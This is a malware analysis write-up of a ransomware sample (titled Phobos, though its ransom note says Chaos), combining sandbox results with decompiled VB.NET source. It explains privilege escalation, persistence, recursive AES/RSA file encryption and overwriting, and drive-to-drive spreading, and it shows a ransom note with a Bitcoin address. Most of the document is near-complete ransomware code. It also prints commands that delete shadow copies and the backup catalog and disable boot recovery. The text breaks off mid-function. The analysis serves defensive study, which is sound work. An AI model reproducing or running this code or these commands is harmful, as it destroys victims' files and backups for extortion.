# Phobos Ransomware family

* https://app.any.run/tasks/d6da4173-2f9d-4b2f-8a20-b0a86dddd510


**File Informations**

| Attribut | Détail |
|----------|--------|
| Type de fichier | PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows |
| MD5 | 761E82385AC656CDB40C5B9189AB0CF2 |
| SHA1 | F5E22AEDB5435AF95D2E76ABD348661909526437 |
| SHA256 | B902F48739FA84BE97815B796681A7B337C7BBCAD14D436AEB6BA93B9FE5AEBD |
| SSDEEP | 6144:pdr9vlTixqewT/IDI32oQqDVJ2r1lXohOBkWTXd7umpq:HmxIIM2ojJ2r1lYhOBkWTphpq |
| Creation Time   | 2023-11-23 01:59:44 UTC|

**Analyse information from ANY.RUN**

Firstly, the ransomware.exe process (PID 2980) self-restarts using svchost.exe, enabling it to gain privileged rights and re-register under PID 2848.
![image](/images/phobos/phobos-02.png)

![image](/images/phobos/phobos-03.png)

It copy the current executable to a specified location and attempt to run it with administrative privileges. 

```
Private Shared processName As String = "svchost.exe"

Private Shared Sub copyResistForAdmin(processName As String)
	Dim friendlyName As String = AppDomain.CurrentDomain.FriendlyName
	Dim location As String = Assembly.GetExecutingAssembly().Location
	Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + friendlyName
	Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\"
	Dim text2 As String = text + processName
	Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo(text2) With { .UseShellExecute = True, .Verb = "runas", .WindowStyle = ProcessWindowStyle.Normal, .WorkingDirectory = text }
	Dim process As Process = New Process()
	process.StartInfo = processStartInfo
	If friendlyName <> processName OrElse location <> text2 Then
		If Not File.Exists(text2) Then
			File.Copy(friendlyName, text2)
			Try
				Process.Start(processStartInfo)
				Environment.[Exit](1)
				Return
			Catch ex As Win32Exception
				If ex.NativeErrorCode = 1223 Then
					Program.copyResistForAdmin(processName)
				End If
				Return
			End Try
		End If
		Try
			File.Delete(text2)
			Thread.Sleep(200)
			File.Copy(friendlyName, text2)
		Catch
		End Try
		Try
			Process.Start(processStartInfo)
			Environment.[Exit](1)
		Catch ex2 As Win32Exception
			If ex2.NativeErrorCode = 1223 Then
				Program.copyResistForAdmin(processName)
			End If
		End Try
	End If
End Sub
```
1.  ***Getting Basic Information:***
    
    -   Retrieves the name of the current executable (`friendlyName`).
    -   Gets the location of the currently executing assembly (`location`).
    -   Defines paths in the Startup folder and Application Data folder.
2.  ***Preparing to Copy and Execute:***
    
    -   Constructs the path for the new executable in the Application Data folder (`text2`).
    -   Sets up a `ProcessStartInfo` object to run the new executable. This includes running it with administrative privileges (`runas`).
3.  ***Copying and Executing:***
    
    -   Checks if the current executable is different from the target executable. If so, it proceeds.
    -   If the target executable (`text2`) doesn't exist, it copies the current executable there and tries to start it. If it fails due to a specific Windows exception (error code 1223, typically indicating the user declined the UAC prompt), it recursively calls itself.
    -   Tries to delete the existing target executable, waits briefly, and copies the current executable again. If this fails, the catch block ignores the error.
    -   Attempts to start the process again and exits the current environment if successful.
4.  ***Error Handling:***
    
    -   Includes handling for `Win32Exception`, particularly for error code 1223, suggesting UAC denial. In this case, the function calls itself recursively.

The malware appears to impact a significant number of files by either creating, modifying, or renaming them.

![information](/images/phobos/phobos-04.png)

The two screenshots depict a file being renamed, while its content remains encrypted. We will examine the source code to understand how this process is carried out.

![information](/images/phobos/phobos-05.png)

![information](/images/phobos/phobos-06.png)

We also have a file named read_it.txt with a ransomware note. This file seems to be generated in every folder.

![information](/images/phobos/phobos-07.png)

We will now study the code

## Code Analyze

### The Entry Point

```
Private Shared processName As String = "svchost.exe"

Private Shared Sub Main(args As String())
	If Program.AlreadyRunning() Then
		Environment.[Exit](1)
	End If
	If Program.checkSleep Then
		Program.sleepOutOfTempFolder()
	End If
	If Program.checkAdminPrivilage Then
		Program.copyResistForAdmin(Program.processName)
	ElseIf Program.checkCopyRoaming Then
		Program.copyRoaming(Program.processName)
	End If
	If Program.checkStartupFolder Then
		Program.addLinkToStartup()
	End If
	Program.lookForDirectories()
	If Program.checkAdminPrivilage Then
		If Program.checkdeleteShadowCopies Then
			Program.deleteShadowCopies()
		End If
		If Program.checkdisableRecoveryMode Then
			Program.disableRecoveryMode()
		End If
		If Program.checkdeleteBackupCatalog Then
			Program.deleteBackupCatalog()
		End If
	End If
	If Program.checkSpread Then
		Program.spreadIt(Program.spreadName)
	End If
	Program.addAndOpenNote()
	Program.SetWallpaper(Program.base64Image)
	New Thread(Sub()
		Program.Run()
	End Sub).Start()
End Sub
```

We will try to detail each of the points.

### AlreadyRunning

```
Private Shared Function AlreadyRunning() As Boolean
	Dim processes As Process() = Process.GetProcesses()
	Dim currentProcess As Process = Process.GetCurrentProcess()
	For Each process As Process In processes
		Try
			If process.Modules(0).FileName = Assembly.GetExecutingAssembly().Location AndAlso currentProcess.Id <> process.Id Then
				Return True
			End If
		Catch ex As Exception
		End Try
	Next
	Return False
End Function
```

This code defines a function named `AlreadyRunning`, which is designed to determine if an instance of the current application is already running on the system. Here's a detailed explanation of what this code does:

1.  **Function Declaration**: `Private Shared Function AlreadyRunning() As Boolean` declares a private and shared (static in C# terms) function that returns a Boolean value (`True` or `False`).
    
2.  **Getting All Running Processes**: `Dim processes As Process() = Process.GetProcesses()` retrieves an array of all processes currently running on the computer.
    
3.  **Getting the Current Process**: `Dim currentProcess As Process = Process.GetCurrentProcess()` gets a reference to the current process (i.e., the application executing this code).
    
4.  **Looping Through Each Process**: The loop `For Each process As Process In processes` iterates through each process in the list of processes obtained earlier.
    
5.  **Comparing Processes**: Inside the loop, the code attempts to compare the main module (executable) of the process being iterated with that of the current process:
    
    -   `process.Modules(0).FileName` refers to the file path of the executable of the process being iterated.
    -   `Assembly.GetExecutingAssembly().Location` refers to the file path of the executable of the current process.
6.  **Checking Process Identity and Uniqueness**: The code checks if the process being iterated is the same as the current process (by comparing their executable paths) and also ensures it is not the same process by comparing their IDs (`Id`).
    
7.  **Exception Handling**: The `Try...Catch` block is used to handle any exceptions that might occur when accessing the modules of the process (for example, if the process does not have the necessary rights to access this information).
    
8.  **Returning the Value**: If a matching process is found, the function returns `True`, indicating that another instance of the application is already running. If no matching process is found, the function returns `False`.
    
In summary, this function is used to check if another instance of the application is already running on the system.

### sleepOutOfTempFolder

```
Private Shared Sub sleepOutOfTempFolder()
	Dim directoryName As String = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location)
	Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
	If directoryName <> folderPath Then
		Thread.Sleep(Program.sleepTextbox * 1000)
	End If
End Sub
```

This code defines a private shared subroutine named `sleepOutOfTempFolder`. The purpose of this subroutine is to pause the execution of the program for a specified duration if the directory in which the executing assembly is located is different from the system's Application Data folder.

1.  **Obtaining the Directory of the Executing Assembly**:
    
    -   `Dim directoryName As String = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location)` retrieves the directory path of the entry assembly (the executable that started the application). `Assembly.GetEntryAssembly().Location` gets the full path of the executable, and `Path.GetDirectoryName` extracts the directory part of this path.
2.  **Retrieving the Application Data Folder Path**:
    
    -   `Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)` retrieves the path to the Application Data folder for the current user. This is a standard folder used to store application-specific data.
3.  **Comparison and Conditional Sleep**:
    
    -   The `If` statement checks if the directory of the executing assembly (`directoryName`) is different from the Application Data folder (`folderPath`). If they are not the same (`directoryName <> folderPath`), it means the application is not running from the Application Data folder.
    -   Inside the `If` block, `Thread.Sleep(Program.sleepTextbox * 1000)` is called. This pauses the executing thread for a specified number of seconds. The duration of the sleep is determined by the value of `Program.sleepTextbox` (presumably a static variable or property defined elsewhere in the `Program` class), multiplied by 1000 to convert it from seconds to milliseconds (since `Thread.Sleep` expects a duration in milliseconds).

In summary, the `sleepOutOfTempFolder` subroutine causes the program to pause for a certain duration if it is running from a location other than the Application Data folder. The actual duration of the pause depends on the value set in `Program.sleepTextbox`.

### copyRoaming

```
Private Shared processName As String = "svchost.exe"

Private Shared Sub copyRoaming(processName As String)
	Dim friendlyName As String = AppDomain.CurrentDomain.FriendlyName
	Dim location As String = Assembly.GetExecutingAssembly().Location
	Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + friendlyName
	Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\"
	Dim text2 As String = text + processName
	If friendlyName <> processName OrElse location <> text2 Then
		If Not File.Exists(text2) Then
			File.Copy(friendlyName, text2)
			Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo(text2)
			processStartInfo.WorkingDirectory = text
			If New Process() With { .StartInfo = processStartInfo }.Start() Then
				Environment.[Exit](1)
				Return
			End If
		Else
			Try
				File.Delete(text2)
				Thread.Sleep(200)
				File.Copy(friendlyName, text2)
			Catch
			End Try
			Dim processStartInfo2 As ProcessStartInfo = New ProcessStartInfo(text2)
			processStartInfo2.WorkingDirectory = text
			If New Process() With { .StartInfo = processStartInfo2 }.Start() Then
				Environment.[Exit](1)
			End If
		End If
	End If
End Sub
```


This code defines a private shared subroutine named `copyRoaming`. Its purpose is to copy the current executable to a specific location and potentially start a new process from that location :

1.  **Obtaining the Name and Location of the Current Assembly**:
    
    -   `Dim friendlyName As String = AppDomain.CurrentDomain.FriendlyName` gets the name of the currently running application.
    -   `Dim location As String = Assembly.GetExecutingAssembly().Location` gets the path of the current executable.
2.  **Path Definitions**:
    
    -   The user's startup path is constructed but not used: `Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + friendlyName`.
    -   `Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\"` sets the path to the user's Application Data folder.
    -   `Dim text2 As String = text + processName` creates a full path for a potential copy of the executable.
3.  **Checking and Copying the Executable**:
    
    -   The condition `If friendlyName <> processName OrElse location <> text2` checks if the current name or location of the executable differs from the targeted ones.
    -   `If Not File.Exists(text2)` checks if the target executable already exists. If not, it is copied over, and a new process is started.
    -   If the file exists, it is deleted and recreated, then a new process is started from this file.
4.  **Starting a New Process**:
    
    -   `Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo(text2)` creates a configuration to start a new process.
    -   `processStartInfo.WorkingDirectory = text` sets the working directory for the new process.
    -   `New Process() With { .StartInfo = processStartInfo }` creates a new process, and if the start is successful, `Environment.[Exit](1)` terminates the current process.

In summary, this subroutine attempts to copy the current executable to the user's application data folder and start a new process from there. This might be used for persistence techniques, where a software wants to ensure it remains active or restarts after a system reboot.

### lookForDirectories

Many points in this section.

```
Private Shared Sub lookForDirectories()
	For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
		If driveInfo.ToString() <> "C:\" Then
			Program.encryptDirectory(driveInfo.ToString())
		End If
	Next
	Dim text As String = Program.userDir + Program.userName + "\Desktop"
	Dim text2 As String = Program.userDir + Program.userName + "\Links"
	Dim text3 As String = Program.userDir + Program.userName + "\Contacts"
	Dim text4 As String = Program.userDir + Program.userName + "\Desktop"
	Dim text5 As String = Program.userDir + Program.userName + "\Documents"
	Dim text6 As String = Program.userDir + Program.userName + "\Downloads"
	Dim text7 As String = Program.userDir + Program.userName + "\Pictures"
	Dim text8 As String = Program.userDir + Program.userName + "\Music"
	Dim text9 As String = Program.userDir + Program.userName + "\OneDrive"
	Dim text10 As String = Program.userDir + Program.userName + "\Saved Games"
	Dim text11 As String = Program.userDir + Program.userName + "\Favorites"
	Dim text12 As String = Program.userDir + Program.userName + "\Searches"
	Dim text13 As String = Program.userDir + Program.userName + "\Videos"
	Program.encryptDirectory(text)
	Program.encryptDirectory(text2)
	Program.encryptDirectory(text3)
	Program.encryptDirectory(text4)
	Program.encryptDirectory(text5)
	Program.encryptDirectory(text6)
	Program.encryptDirectory(text7)
	Program.encryptDirectory(text8)
	Program.encryptDirectory(text9)
	Program.encryptDirectory(text10)
	Program.encryptDirectory(text11)
	Program.encryptDirectory(text12)
	Program.encryptDirectory(text13)
	Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
	Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments))
	Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures))
	Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic))
	Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos))
	Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory))
End Sub
```

It will scan specific directories and iterates through all available drives on a system and applies a specific action to each, except for the drive "C:".

### encryptDirectory

```
Private Shared Sub encryptDirectory(location As String)
	Try
		Dim files As String() = Directory.GetFiles(location)
		Dim flag As Boolean = True
		For i As Integer = 0 To files.Length - 1
			Try
				Dim extension As String = Path.GetExtension(files(i))
				Dim fileName As String = Path.GetFileName(files(i))
				If Array.Exists(Of String)(Program.validExtensions, Function(E As String) E = extension.ToLower()) AndAlso fileName <> Program.droppedMessageTextbox Then
					Dim fileInfo As FileInfo = New FileInfo(files(i))
					fileInfo.Attributes = FileAttributes.Normal
					If fileInfo.Length < 2117152L Then
						If Program.encryptionAesRsa Then
							Program.EncryptFile(files(i))
						End If
					ElseIf fileInfo.Length > 200000000L Then
						Dim random As Random = New Random()
						Dim num As Integer = random.[Next](200000000, 300000000)
						Dim [string] As String = Encoding.UTF8.GetString(Program.random_bytes(num))
						File.WriteAllText(files(i), Program.randomEncode([string]))
						File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))
					Else
						Dim string2 As String = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4))
						File.WriteAllText(files(i), Program.randomEncode(string2))
						File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))
					End If
					If flag Then
						flag = False
						File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages)
					End If
				End If
			Catch
			End Try
		Next
		Dim directories As String() = Directory.GetDirectories(location)
		For j As Integer = 0 To directories.Length - 1
			Program.encryptDirectory(directories(j))
		Next
	Catch ex As Exception
	End Try
End Sub
```


It appears to be designed to encrypt files in a specific directory and its subdirectories.

1.  **Getting Files in the Directory**:
    
    -   `Dim files As String() = Directory.GetFiles(location)` retrieves all the files in the specified directory.
2.  **Looping Through Files**:
    
    -   The code loops through each file in the directory.
3.  **Checking File Extensions**:
    
    -   `If Array.Exists(Of String)(Program.validExtensions, Function(E As String) E = extension.ToLower())` checks if the file's extension is in the list of valid extensions.
4.  **Encrypting Files**:
    
    -   If the file size is below a certain limit (`2117152L`), the file is encrypted using a specific method (`Program.EncryptFile`).
    -   For files larger than `200000000L`, the file is replaced with a set of random data.
    -   For files of intermediate size, a portion of the content is replaced with random data.
5.  **Renaming Encrypted Files**:
    
    -   The encrypted or altered files are renamed with a new, randomly generated extension.
6.  **Adding a Message in the Directory**:
    
    -   A message is written in the directory after encrypting the first file.
7.  **Encrypting Subdirectories**:
    
    -   The same procedure is applied recursively to subdirectories.

### Encrypting Files

This code performs different actions on files based on their size:

1.  **For Small Files (< 2,117,152 bytes)**:
    
    -   `If fileInfo.Length < 2117152L` checks if the file size is smaller than approximately 2.1 MB.
    -   If `Program.encryptionAesRsa` is `True`, it indicates that an encryption condition is enabled. `Program.EncryptFile(files(i))` is then called to encrypt the file.
2.  **For Very Large Files (> 200,000,000 bytes)**:
    
    -   `ElseIf fileInfo.Length > 200000000L` deals with files larger than 200 MB.
    -   A `Random` object is created to generate random numbers.
    -   `Dim num As Integer = random.[Next](200000000, 300000000)` generates a random number between 200 and 300 million, which determines the size of the random data to generate.
    -   `Dim [string] As String = Encoding.UTF8.GetString(Program.random_bytes(num))` converts the generated random bytes into a UTF-8 string.
    -   `File.WriteAllText(files(i), Program.randomEncode([string]))` writes this random string to the file, effectively replacing its content.
    -   `File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))` renames the file with a new random extension.
3.  **For Medium-Sized Files**:
    
    -   If the file size is between 2.1 MB and 200 MB, a part of its content is replaced with random data.
    -   `Dim string2 As String = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4))` generates a random string about one quarter the size of the file.
    -   The file is then altered and renamed in the same way as for the larger files.
4.  **Adding a Message in the Directory**:
    
    -   If `flag` is `True` (which seems to be the case for the first file processed), the code writes a set of lines (`Program.messages`) to a new file in the directory. This file has the name contained in `Program.droppedMessageTextbox`.
    -   `flag` is then set to `False` to prevent adding the same message multiple times.

### Small Files Encrypting Process

```
Public Shared Sub EncryptFile(file As String)
	Dim array As Byte() = File.ReadAllBytes(file)
	Dim text As String = Program.CreatePassword(20)
	Dim bytes As Byte() = Encoding.UTF8.GetBytes(text)
	Dim array2 As Byte() = Program.AES_Encrypt(array, bytes)
	File.WriteAllText(file, "<EncryptedKey>" + Program.RSAEncrypt(text, Program.rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(array2))
	File.Move(file, file + "." + Program.RandomStringForExtension(4))
End Sub

Public Shared Function CreatePassword(length As Integer) As String
	Dim stringBuilder As StringBuilder = New StringBuilder()
	Dim random As Random = New Random()
	While True
		Dim num As Integer = 0
		Dim num2 As Integer = length
		length = num2 - 1
		If num >= num2 Then
			Exit For
		End If
		stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"(random.[Next]("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)))
	End While
	Return stringBuilder.ToString()
End Function

Public Shared Function AES_Encrypt(bytesToBeEncrypted As Byte(), passwordBytes As Byte()) As Byte()
	Dim array As Byte() = Nothing
	Dim array2 As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
	Using memoryStream As MemoryStream = New MemoryStream()
		Using rijndaelManaged As RijndaelManaged = New RijndaelManaged()
			rijndaelManaged.KeySize = 256
			rijndaelManaged.BlockSize = 128
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passwordBytes, array2, 1000)
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8)
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8)
			rijndaelManaged.Mode = CipherMode.CBC
			Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
				cryptoStream.Close()
			End Using
			array = memoryStream.ToArray()
		End Using
	End Using
	Return array
End Function

Public Shared Function RSAEncrypt(textToEncrypt As String, publicKeyString As String) As String
	Dim bytes As Byte() = Encoding.UTF8.GetBytes(textToEncrypt)
	Dim text2 As String
	Using rsacryptoServiceProvider As RSACryptoServiceProvider = New RSACryptoServiceProvider(1024)
		Try
			rsacryptoServiceProvider.FromXmlString(publicKeyString.ToString())
			Dim array As Byte() = rsacryptoServiceProvider.Encrypt(bytes, True)
			Dim text As String = Convert.ToBase64String(array)
			text2 = text
		Finally
			rsacryptoServiceProvider.PersistKeyInCsp = False
		End Try
	End Using
	Return text2
End Function

Public Shared Function rsaKey() As String
	Dim stringBuilder As StringBuilder = New StringBuilder()
	stringBuilder.AppendLine("<?xml version=""1.0"" encoding=""utf-16""?>")
	stringBuilder.AppendLine("<RSAParameters xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">")
	stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>")
	stringBuilder.AppendLine("  <Modulus>5npxENgr574KdDbklR5yNt0QvGv5s5Jq1ND9rVml02X0ieOSHV02/2cJe8zYhwwhiMmIs6YM45fl/m1G2ge7wDQoTW92nML/OTygPHW9JICE4JN2rPe3kavESu9Xpsp/hdR/MwlTS8hxt6I3k37+CIrVWffiiw1mLZF7cnJN6NE=</Modulus>")
	stringBuilder.AppendLine("</RSAParameters>")
	Return stringBuilder.ToString()
End Function
```

This code contains several methods that work together to encrypt a file. Here's a detailed explanation of each method:

1.  **`EncryptFile` Method**:
    
    -   This method takes a file path as a parameter.
    -   It first reads all bytes of the file: `Dim array As Byte() = File.ReadAllBytes(file)`.
    -   Then, it generates a random 20-character password using `Program.CreatePassword(20)`.
    -   This password is converted into bytes (`Encoding.UTF8.GetBytes(text)`).
    -   The file's data is encrypted using AES with this key: `Program.AES_Encrypt(array, bytes)`.
    -   The file is then rewritten with the RSA-encrypted key (`Program.RSAEncrypt(text, Program.rsaKey())`) and the AES-encrypted data, both encoded in base64.
    -   Finally, the file is renamed with a new random extension.
2.  **`CreatePassword` Method**:
    
    -   Generates a random password of the specified length.
    -   Uses a `Random` instance to select random characters from a predefined string.
3.  **`AES_Encrypt` Method**:
    
    -   Encrypts the provided bytes (`bytesToBeEncrypted`) using the AES algorithm.
    -   Uses `RijndaelManaged` with a 256-bit key size and CBC encryption mode.
    -   The key and IV (initialization vector) are generated from the password bytes using `Rfc2898DeriveBytes`.
4.  **`RSAEncrypt` Method**:
    
    -   Encrypts a string using RSA with a public key.
    -   Converts the string to bytes, encrypts it with RSA, then encodes the result in base64.
5.  **`rsaKey` Method**:
    
    -   Returns an RSA public key as an XML string.

This code combines AES encryption for the file's data and RSA encryption for the AES key.

### Medium-Sized Files Encrypting Process
```
Dim string2 As String = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4))
File.WriteAllText(files(i), Program.randomEncode(string2))
File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))

Public Shared Function random_bytes(length As Integer) As Byte()
	Dim random As Random = New Random()
	length += 1
	Dim array As Byte() = New Byte(length - 1) {}
	random.NextBytes(array)
	Return array
End Function

Public Shared Function randomEncode(plainText As String) As String
	Dim bytes As Byte() = Encoding.UTF8.GetBytes(plainText)
	Return String.Concat(New String() { "<EncyptedKey>", Program.Base64EncodeString(Program.RandomString(41)), "<EncyptedKey> ", Program.RandomString(2), Convert.ToBase64String(bytes) })
End Function

Public Shared Function Base64EncodeString(plainText As String) As String
	Dim bytes As Byte() = Encoding.UTF8.GetBytes(plainText)
	Return Convert.ToBase64String(bytes)
End Function

Public Shared Function RandomString(length As Integer) As String
	Dim stringBuilder As StringBuilder = New StringBuilder()
	For i As Integer = 0 To length - 1
		Dim c As Char = "abcdefghijklmnopqrstuvwxyz0123456789"(Program.random.[Next](0, "abcdefghijklmnopqrstuvwxyz0123456789".Length))
		stringBuilder.Append(c)
	Next
	Return stringBuilder.ToString()
End Function
```
#### File Manipulation

1.  **Generating a Random String Based on File Size**:
    
    -   `Dim string2 As String = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4))`: This line converts one quarter of the file's size (`fileInfo.Length / 4`) into an array of random bytes, and then into a UTF-8 string.
2.  **Rewriting and Renaming the File**:
    
    -   `File.WriteAllText(files(i), Program.randomEncode(string2))`: Rewrites the file with the content returned by the `randomEncode` method.
    -   `File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))`: Renames the file by adding a new randomly generated extension.

#### String Processing Methods


1.  **`random_bytes` Function**:
    
    -   Generates an array of random bytes of the specified length using `Random.NextBytes`.
    -   Returns this byte array.
2.  **`randomEncode` Function**:
    
    -   Encodes the input string (`plainText`) into UTF-8 bytes, then into a base64 string.
    -   Returns a concatenated string with random elements and the base64-encoded `plainText`. It includes tags `<EncyptedKey>` and random strings, both a 41-character long base64-encoded string and a 2-character random string.
3.  **`Base64EncodeString` Function**:
    
    -   Converts the input string (`plainText`) into UTF-8 bytes and then encodes these bytes into a base64 string.
4.  **`RandomString` Function**:
    
    -   Generates a random alphanumeric string of the specified length.

#### Analysis

This code appears to be part of a file manipulation process, potentially for obfuscation or encryption purposes. Files are modified to contain random data and are renamed.

### Very Large Files Encrypting Process

```
Dim random As Random = New Random()
Dim num As Integer = random.[Next](200000000, 300000000)
Dim [string] As String = Encoding.UTF8.GetString(Program.random_bytes(num))
File.WriteAllText(files(i), Program.randomEncode([string]))
File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))

Public Shared Function random_bytes(length As Integer) As Byte()
	Dim random As Random = New Random()
	length += 1
	Dim array As Byte() = New Byte(length - 1) {}
	random.NextBytes(array)
	Return array
End Function

Public Shared Function randomEncode(plainText As String) As String
	Dim bytes As Byte() = Encoding.UTF8.GetBytes(plainText)
	Return String.Concat(New String() { "<EncyptedKey>", Program.Base64EncodeString(Program.RandomString(41)), "<EncyptedKey> ", Program.RandomString(2), Convert.ToBase64String(bytes) })
End Function

Public Shared Function Base64EncodeString(plainText As String) As String
	Dim bytes As Byte() = Encoding.UTF8.GetBytes(plainText)
	Return Convert.ToBase64String(bytes)
End Function

Public Shared Function RandomString(length As Integer) As String
	Dim stringBuilder As StringBuilder = New StringBuilder()
	For i As Integer = 0 To length - 1
		Dim c As Char = "abcdefghijklmnopqrstuvwxyz0123456789"(Program.random.[Next](0, "abcdefghijklmnopqrstuvwxyz0123456789".Length))
		stringBuilder.Append(c)
	Next
	Return stringBuilder.ToString()
End Function
```
### Very Large Files Encrypting Process

The key difference in this revised code compared to the previous one lies in the way the random string (`[string]`) is generated and used :

#### Revised Code Snippet

1.  **Generation of a Much Larger Random String**:
    
    -   `Dim num As Integer = random.[Next](200000000, 300000000)`: This line generates a random integer (`num`) between 200 million and 300 million. This number represents the length of the random byte array to be generated.
    -   `Dim [string] As String = Encoding.UTF8.GetString(Program.random_bytes(num))`: Generates a random byte array of length `num` and then converts it to a UTF-8 string. The resulting string is much larger compared to the previous version, where the length was a quarter of the `fileInfo.Length`.
2.  **File Rewriting and Renaming**:
    
    -   `File.WriteAllText(files(i), Program.randomEncode([string]))`: Writes the `Program.randomEncode([string])` result, which is a significantly larger and randomly generated string, into the file at `files(i)`.
    -   `File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))`: Renames the file, appending a new random extension.

#### Implications of the Change

-   **File Size Impact**: The most significant impact of this change is on the file size. Because `num` is a large number (between 200 and 300 million), the random string generated will be much larger, potentially making the file sizes significantly bigger after the rewrite.
-   **Performance Considerations**: Generating and writing such a large amount of random data to files could have performance implications, especially if this operation is performed on multiple files or on systems with limited resources.

Overall, this modification shifts the focus of the file manipulation from altering or encrypting the existing content to filling the files with a substantial amount of random data.

#### System Alteration

```
If Program.checkAdminPrivilage Then
		If Program.checkdeleteShadowCopies Then
		Program.deleteShadowCopies()
	End If
	If Program.checkdisableRecoveryMode Then
		Program.disableRecoveryMode()
	End If
	If Program.checkdeleteBackupCatalog Then
		Program.deleteBackupCatalog()
	End If
End If

Private Shared Sub deleteShadowCopies()
	Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete")
End Sub

Private Shared Sub disableRecoveryMode()
	Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no")
End Sub

Private Shared Sub deleteBackupCatalog()
	Program.runCommand("wbadmin delete catalog -quiet")
End Sub
```

This code executes system commands that affect data backup and recovery on Windows, but only under certain conditions :

1.  **Checking for Administrator Privileges**:
    
    -   The code first checks if the program has administrator privileges (`If Program.checkAdminPrivilage`).
2.  **If Privileges are Confirmed, the Following Actions are Executed**:
    
    -   **Deleting Shadow Copies** (`deleteShadowCopies`): If `Program.checkdeleteShadowCopies` is true, the program executes a command to delete all shadow copies (system backups) using `vssadmin` and `wmic`.
    -   **Disabling Recovery Mode** (`disableRecoveryMode`): If `Program.checkdisableRecoveryMode` is true, the program executes commands to disable Windows' automatic recovery mode using `bcdedit`.
    -   **Deleting Backup Catalog** (`deleteBackupCatalog`): If `Program.checkdeleteBackupCatalog` is true, the program executes a command to delete the Windows backup catalog with `wbadmin`.

#### Importance of This Code

This code is used for disabling or removing key backup and recovery features on a Windows system.

### spreadName

```
Private Shared checkSpread As Boolean = True
Private Shared spreadName As String = "surprise.exe"

If Program.checkSpread Then
	Program.spreadIt(Program.spreadName)
End If

Private Shared Sub spreadIt(spreadName As String)
	For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
		If driveInfo.ToString() <> "C:\" AndAlso Not File.Exists(driveInfo.ToString() + spreadName) Then
			Try
				File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName)
			Catch
			End Try
		End If
	Next
End Sub
```

This part of code is designed to self-replicate (spread) across different drives of the computer, except for the main drive (C:).

1.  **Check for Spreading**:
    
    -   The code checks if `Program.checkSpread` is true. If so, the method `Program.spreadIt(Program.spreadName)` is called.
2.  **`spreadIt` Method**:
    
    -   Iterates through all available drives on the computer (`DriveInfo.GetDrives()`).
    -   If the drive is not C:\ and a file named `spreadName` (here, "surprise.exe") does not exist on that drive, the current executable file (the application itself) is copied to that drive with the name `spreadName`.

### addAndOpenNote (Ransomware Note)

```
Private Shared droppedMessageTextbox As String = "read_it.txt"

Private Shared messages As String() = New String() { "----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", "" }

Private Shared Sub addAndOpenNote()
